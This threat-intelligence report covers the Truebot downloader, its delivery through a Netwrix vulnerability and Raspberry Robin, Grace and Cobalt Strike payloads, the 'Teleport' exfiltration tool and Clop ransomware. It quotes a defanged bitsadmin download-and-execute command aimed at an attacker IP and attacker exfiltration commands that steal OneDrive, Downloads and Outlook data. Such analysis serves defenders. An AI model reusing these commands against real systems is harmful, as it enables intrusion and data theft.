Truebot was first identified in 2017 and researchers have\nlinked it to a threat actor called Silence Group that is responsible for several high-impact\nattacks on financial institutions in several countries around the world.\n\n[There are claims by](https://www.group-ib.com/resources/research-hub/silence-moving-into-the-darkside/) [other researchers that this group is associated with the well-known](https://www.telekom.com/en/blog/group/article/cybersecurity-ta505-s-box-of-chocolate-597672)\nthreat actor TA505 (aka Evil Corp). In our research, we found that one of the new follow-on\npayloads that Truebot drops is Grace (aka FlawedGrace and GraceWire) malware, which is\nattributed to TA505, further supporting these claims.\n\nRecently, the attackers have shifted from using malicious emails as their primary delivery\nmethod to other techniques. In August, we saw a small number of attacks that exploited a\n[recent remote code execution vulnerability in Netwrix auditor. In October, a larger number of](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-31199)\ninfections leveraged Raspberry Robin, a recent malware spread through USB drives, as a\ndelivery vector. We believe with moderate confidence that during November, the attackers\nstarted using yet another way to distribute the malware.\n\nPost-compromise activity included data theft and the execution of Clop ransomware. While\ninvestigating one of these attacks, we found what seems to be a fully featured custom data\nexfiltration tool, which we are calling \"Teleport,\" that was extensively used to steal\ninformation during the attack.\n\nSo far, we have identified two different Truebot botnets. One is distributed worldwide, but\nwith particular focus on Mexico, Pakistan, and Brazil. The second, more recent botnet\nappears to be focused on the U.S. While we don't have enough information to say that there\nis a specific focus on a sector, we noticed a number of compromised education sector\norganizations.\n\n## New attack vectors\n\nIn August, we noticed a small number of cases where Truebot was executed after the\nexploitation of a vulnerability in Netwrix Auditor, an IT asset management tool.\n\n\n-----\n\nWe have high confidence that this was used as the entry vector on some of the\ncompromised organizations. However, due to the reduced exposure of this product directly\non the internet, it is unlikely that the attackers managed to compromise a high number of\nsystems this way.\n\nLater, in the beginning of October, we started seeing a bigger uptick in Truebot infections,\nas it started being delivered by Raspberry Robin malware. This was also noticed by others,\n[such as Microsoft, which wrote a blog post focused on the connections of Raspberry Robin](https://www.microsoft.com/en-us/security/blog/2022/10/27/raspberry-robin-worm-part-of-larger-ecosystem-facilitating-pre-ransomware-activity/)\nto a larger ecosystem that included Truebot as one of the payloads.\n\nWe believe with high confidence that these two vectors, mainly the Raspberry Robin\ndelivery, led to the creation of a botnet of over 1,000 systems that is distributed worldwide,\nbut with particular focus on Mexico, Brazil, and Pakistan, as seen in the following image.\n\nIn November, we started seeing a new botnet being created.The following image shows the\nevolution of the infections on this botnet, based on openDNS telemetry:\n\n\n-----\n\nWhile the the victims of the first botnet were mostly desktop systems not directly accessible\nfrom the internet, this second botnet is almost exclusively composed of Windows servers,\ndirectly connected to the internet, and exposing several Windows services such as SMB,\nRDP, and WinRM, but interestingly not Netwrix. This suggests that the attackers are using\nanother distribution mechanism, although we have not yet identified this attack vector.\n\nThis new botnet, with over 500 infections at the time of writing, seems to be focused on the\nU.S. (around 75% of infections). The following image shows the geographic infection\ndistribution.\n\n## Netwrix vulnerability (CVE-2022-31199) based delivery\n\n\n-----\n\nBetween mid-August and September, we observed a small number of events in which\nsuspicious commands were executed by a process named UAVRServer.exe. This process\ntriggered the execution of bitsadmin to download and execute a binary. Further research\nrevealed that this was an updated version of Truebot.\n\nThe following is an example of one of these commands executed by the UAVRServer.exe\nprocess:\n```\nC:\\\\Windows\\\\System32\\\\cmd.exe /c bitsadmin /transfer MSVCP\nhxxp://179[.]60[.]150[.]53:80/download/msruntime.dll\nc:\\\\ProgramData\\\\msruntime.dll&rundll32 /S c:\\\\ProgramData\\\\msruntime.dll,fff&del\nc:\\\\ProgramData\\\\msruntime.dll\n\n\n```\nAlthough we were not able to collect the exploit code. Because multiple of these events\noccurred in the same timeframe on unrelated organizations, we believe with high\nconfidence that these events are the result of the exploitation of a vulnerability in Netwrix\n[Auditor (CVE-2022-31199) that was made public in July 2022 by Bishop Fox.](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-31199)\n\nNetwrix Auditor is an auditing tool that is used to assess the compliance with security and\nother best practices of IT assets and, according to the vulnerability disclosure document:\n_“Netwrix Auditor is vulnerable to an insecure object deserialization issue that is caused by_\n_an unsecured .NET remoting service. An attacker can submit arbitrary objects to the_\n_application through this service to achieve remote code execution on Netwrix Auditor_\n_servers.”_\n\nHowever, the vulnerable .NET remoting service would not usually be exposed to the\ninternet, which may explain why we have seen only a small number of these attacks. We\nwere able to confirm that at least one of the exploited systems was directly exposed to the\ninternet with minimal or no firewall protection, and believe with high confidence that this\nexploit was the entry vector to an attack that included further post-compromise activity.\n\n\n-----\n\nAccording to the vulnerability disclosure document: _Since this service is typically executed_\n_with extensive privileges in an Active Directory environment, the attacker would likely be_\n_able to compromise the Active Directory domain.”_\n\nThis means that exploiting the vulnerability is effectively a fast track to compromising an\norganization domain-wide. It also means that this vulnerability is likely to be exploited within\norganizations that are already compromised to get administrative rights without raising any\nred flags.\n\nThis vulnerability had been published only a few weeks before the attacks took place, and\nthe number of systems exposed from the internet is expected to be quite small. This\nsuggests that the attackers are not only on the lookout for new infection vectors, but are\nalso able to quickly test them and incorporate them into their workflow.\n\n## Raspberry Robin delivery\n\nMore recently, since the beginning of October, we started seeing a higher number of\nsystems infected with Truebot. This timeframe corresponded with new research that found\nmany of these systems had previous Raspberry Robin infections that were delivering\nTruebot.\n\n[This has been documented by Microsoft in a blog detailing how Raspberry Robin is part of a](https://www.microsoft.com/en-us/security/blog/2022/10/27/raspberry-robin-worm-part-of-larger-ecosystem-facilitating-pre-ransomware-activity/)\nlarger criminal ecosystem and has recently started delivering a few other malware families,\nincluding FakeUpdates, IcedID, Bumblebee, and Truebot.\n\nIn our telemetry, we have observed multiple occurrences of Raspberry Robin delivering\nTruebot. The following image illustrates the attack sequence.\n\nThe system was infected with Raspberry Robin through a USB device and, just a few\nminutes later, the malicious process downloaded the Truebot .dll file and executed it using\nrundll32.exe.\n\n\n-----\n\nIn other cases, the Raspberry Robin infection that delivered Truebot had been present for\nsome time.\n\n## New Truebot version\n\nTruebot is a downloader malware. As such, its main goal is to infect systems, collect\ninformation to help triage interesting targets, and deploy additional payloads. Once a\nsystem is infected, the malware collects information and sends it to the attacker’s command\nand control (C2). This version collects additional information: a screenshot, the computer\nname, the local network name, and active directory trust relations.\n\nThis collected information hints at what the attackers are looking for. Active directory trust\nrelations allow organizations to share users and resources across domains. Some use\ncases include extranets, connecting service providers or even mergers and acquisitions.\n\nThis suggests the attackers are targeting large organizations, where these relations are\nmore commonly deployed. Besides being a great indicator of a large organization, one\nexample where this information could prove useful would be in finding a poorly protected\nnetwork (for example, a company acquisition) that would provide an entry route to a more\nsecure network.\n\nAs a downloader tool, there are also some features that were not present in previously\ndocumented versions of the malware. Besides downloading and executing files, the\nmalware is now able to load and execute additional modules and shellcodes in memory,\nmaking the payloads less likely to be detected.\n\n\n-----\n\nAs illustrated in the image above, the 404NOTFOUND command is used to emit no\ncommand. The “KLL | KLLSELF” commands causes the bot to uninstal, and, if the response\ncontains an HTTP URL followed by a “| <action>” keyword, it performs one of the following\nactions:\n\n|EXE – Download and run .exe file\n|DLL – Download and run .dll file\n|PS1 – Download and run .ps1 file\n|BAT – Download and run .bat file\n|DNM – Download and run .dll in memory\n|SCH – Download and run shellcode\n|S64 – Download and run 64 bit shellcode\n\nThe communication protocol changed slightly to include the new features. In summary, the\nHTTP communication includes new fields to include the network name and trust relations\ndata and it is sent as a POST request with a parameter “q=<base64 encoded data>”. The\n[remaining protocol details and encryption mechanism seem to remain unchanged, as has](https://securelist.com/the-silence/83009/)\n[been](https://norfolkinfosec.com/how-the-silence-downloader-has-evolved-over-time/) [previously documented.](https://www.group-ib.com/resources/research-hub/silence-moving-into-the-darkside/)\n\n## Post-compromise activity\n\nPost compromise, we found two payloads delivered by Truebot, Cobalt Strike and Grace\nmalware. and what seems to be a custom data exfiltration tool that was used extensively by\nthe attackers to steal information from the network.\n\n## Grace and Cobalt Strike\n\nOnce the systems have been compromised with Truebot, the attackers triage what seem to\nbe interesting systems for further analysis and deploy additional malware to assist in that\nanalysis.\n\nIn this case, the payloads we found were 32- and 64-bit versions of Cobalt Strike reverse\nshell shellcode, Cobalt Strike delivered through PowerShell reflection, and a Grace\nshellcode loader containing a complex packer that contained Grace malware. This is a fairly\ncomplex packer, that was called “GraceWrapper” by [Outpost24, that extensively](https://outpost24.com/sites/default/files/2022-10/Outpost24_Gracewrapper_Report_2022.pdf)\n[documented it in a recent blog post, based on samples from an attack documented by](https://www.proofpoint.com/us/blog/threat-insight/whatta-ta-ta505-ramps-activity-delivers-new-flawedgrace-variant)\nProofpoint in late 2021 where the new version of Grace was spotted.\n\n\n-----\n\nAfter unpacking, we were able to obtain a Grace binary, easily identifiable by a string in\nmemory as well as the C++ class names left in the binary.\n\n\n-----\n\nFinding Grace as a payload is interesting, as it is known to be almost exclusively used by\nTA505, which further strengthens previous claims of a connection between Silence Group\n[and TA505 made by Group-IB, which was based on source code comparison with](https://www.group-ib.com/resources/research-hub/silence-moving-into-the-darkside/)\n[FlawedAmmyy; and by Deutsche Telekom, by identifying different malware packed with](https://www.telekom.com/en/blog/group/article/cybersecurity-ta505-s-box-of-chocolate-597672)\nTA505’s custom packer.\n\n## \"Teleport\" exfiltration tool\n\nAfter dropping one of the described payloads, the post-compromise attack flow is similar to\nthat of other human-operated attacks. However, while investigating, we came across a set\nof commands to exfiltrate stolen data that made use of a tool that was unknown to us.\n\n\n-----\n\nAfter examining the binary, we found what seems to be a custom data exfiltration tool built\nin C++ and containing several features that make the process of data exfiltration easier and\nstealthier. We are calling it \"Teleport\" based on the communication encryption key\nhardcoded in the binary.\n\nRegarding the tool’s features, the following usage information provided by the tool itself is a\ngreat summary:\n```\nUsage: tool.exe /RH:str /RP:int [/RS:int] [/P:str] [/D:str] [/DS:str] [/M:str]\n[/MX:str] [/SL:int] [/SU:int] [/CS:str] [/CU:str] [/MS:str] [/MU:str] [/E] [/K] [/Q]\n\n/RH:str -- Server host name to upload to\n\n/RP:int -- Server port number to upload to\n\n/RS:int -- Upload speed (in kilobytes per second)\n\n/P:str -- Directory prefix\n\n/D:str -- Directory to download from (recursive search)\n\n/DS:str -- Directory to download from (non-recursive search)\n\n/M:str -- File mask (default is *.*)\n\n/MX:str -- File mask to exclude\n\n/SL:int -- Lower size limit (in bytes)\n\n/SU:int -- Upper size limit (in bytes)\n\n/CS:str -- Creation date since (DDMMYYYY)\n\n/CU:str -- Creation date until (DDMMYYYY)\n\n/MS:str -- Modified date since (DDMMYYYY)\n\n/MU:str -- Modified date until (DDMMYYYY)\n\n/E -- Prescan mode (cache files before sending)\n\n/K -- Remove itself after execution\n\n/Q -- Quiet mode (don't show messages)\n\nEither /D or /DS must be specified.\n\nFlags /M, /MX, /D and /DS may be used more than once.\n\n\n```\nLooking at the feature list we can see that, while not malicious per se, it has some features\nthat are not common in remote copying tools that are useful to an attacker exfiltrating data\nduring an attack:\n\nLimiting the upload speed, which can make the transmission go undetected by tools\nthat monitor for large data exfiltration. This can avoid making the network slow due to\nthe file copying activity.\nThe communication is encrypted with a custom protocol to hide what information is\nbeing transmitted.\nLimiting the file size, which can maximize the number of stolen files by avoiding\nlengthy copies of files that may not be interesting.\nThe ability to delete itself after use, which is ideal to keep it as unknown as possible.\n\nWhile testing Teleport, we saw that the data was not in clear text. Further analysis revealed\nthat it uses a custom communication protocol that encrypts data using AES and a\nhardcoded key. Reverse engineering revealed the following protocol structure that wraps\nthe messages with an encryption layer.\n\n\n-----\n\nMost messages sent by the tool to its server start with a message-type identifier, followed\nby the size of the remaining payload, of which the first four bytes are a CRC32 check to\nensure the integrity of the message, the next 16 bytes are a random initialization vector. and\nthe remaining bytes are the encrypted payload content using the algorithm\nAES/CBC/Nopadding.\n\nThe use of a custom data exfiltration tool is curious. Why would an attacker develop such a\ntool when there are so many different file copying solutions? There are a few possible\nreasons.\n\nFor example, it makes the process of stealing interesting information from an unknown\nnetwork of unknown systems faster. If we look at its use during the attack, we can see that\nthe attackers are repeating on a large number of systems a few commands that the\nattackers know have good potential of gathering valuable information. For example:\n```\n<redacted>.exe /RH:<exfiltration server> /RP:443 /x:<password> /MX:thumbs.db\n/MX:*.exe /MX:*.mov /MX:*.dll /P:<remote path> /d:\\\\<local network host>\\c$\\users\\\n<username>\\onedrive\n\n\n<redacted>.exe /RH:<exfiltration server> /RP:443 /x:<password> /MX:thumbs.db\n/M:*.ost /M:*.pst /P:<remote path> /d:\\\\<local network host>\\c$\\users\\\n<username>\\appdata\\local\\microsoft\\outlook\n\n\n<redacted>.exe /RH:<exfiltration server> /RP:443 /x:<password> /MX:thumbs.db\n/MX:*.exe /MX:*.mov /MX:*.dll /P:<remote path> /d:\\\\<local network host>\\c$\\users\\\n<username>\\downloads\n\n\n```\nThese commands effectively collect interesting files from the user’s OneDrive and\nDownloads folders and collect the user’s Outlook emails. Combining filtering by extension,\nfile size, and file age allows the creation of commands that are repeatable and effective.\n\nAnother reason includes stealth. It is not on the list of common file copying files, which\nprovides limited stealthiness, but it also allows the limitation of bandwidth usage and\ncommunication encryption.\n\n## The Clop attack\n\nAs previously mentioned, one of the possible outcomes of these attacks is double extortion\nusing Clop ransomware. We had the opportunity to investigate one of these attacks in\nfurther detail. The following table summarizes the techniques used organized by the MITRE\nATT&CK framework.\n\n\n-----\n\nThe attack was in its essence similar to many other human-operated ransomware attacks.\nAfter compromise, the attackers dropped Cobalt Strike on several systems and started\nmapping the network and moving laterally to systems of interest. During the exploration and\nlateral movement phases, the attackers browsed key server and desktop file systems,\nconnected to SQL databases, and collected data that was exfiltrated using the Teleport tool\nto an attacker-controlled server. Once sufficient data had been collected, the attackers\ncreated scheduled tasks on a large number of systems to simultaneously start executing\nthe Clop ransomware and encrypt the highest possible volume of data.\n\n## Coverage\n\nWays our customers can detect and block this threat are listed below.\n\n[Cisco Secure Endpoint (formerly AMP for Endpoints) is ideally suited to prevent the](https://www.cisco.com/c/en/us/products/security/amp-for-endpoints/index.html)\n[execution of the malware detailed in this post.
